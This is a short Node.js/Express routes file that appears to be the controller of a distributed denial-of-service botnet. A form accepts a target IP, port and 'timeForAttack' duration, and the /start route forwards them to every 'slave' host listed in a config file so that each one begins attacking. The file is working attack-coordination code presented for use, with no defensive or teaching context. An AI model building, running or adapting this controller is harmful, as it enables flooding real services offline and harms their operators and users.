var slaves = require("../config/slaves.js"),
    request = require("request");
module.exports = function(app){
    app.get('/',function(req,res){
	console.log('entered');
        res.render('index.ejs');
    });
    app.post("/start",function(req,res){
        var prt, slaveSRC, slavePRT, uri;
        var ip = req.body.ip;
        var timeForAttack = req.body.ttl;
        if(req.body.hasOwnProperty('prt')){
            prt = req.body.prt;
        }else{
            prt = 80;
        }
        slave = slaves.slave;
        for(var i = 0; i < slave.length; i++){
            slaveSRC = slave[i].ip;
            slavePRT = slave[i].prt;
            uri = "http://" + slaveSRC + ":" + slavePRT + "/" + "start";
            console.log(uri);
            request({
                uri: uri,
                method: "POST",
                form : {
                    ip: ip,
                    prt: prt,
                    ttl: timeForAttack
                }
            }, function(error,response,body){
                if(error){
                    console.log(error);
                }
            })
        }
        res.redirect('/acknowledgement');
    });
    app.get('/acknowledgement',function(req,res){
        res.render('acknowledgement.ejs');
    });
}
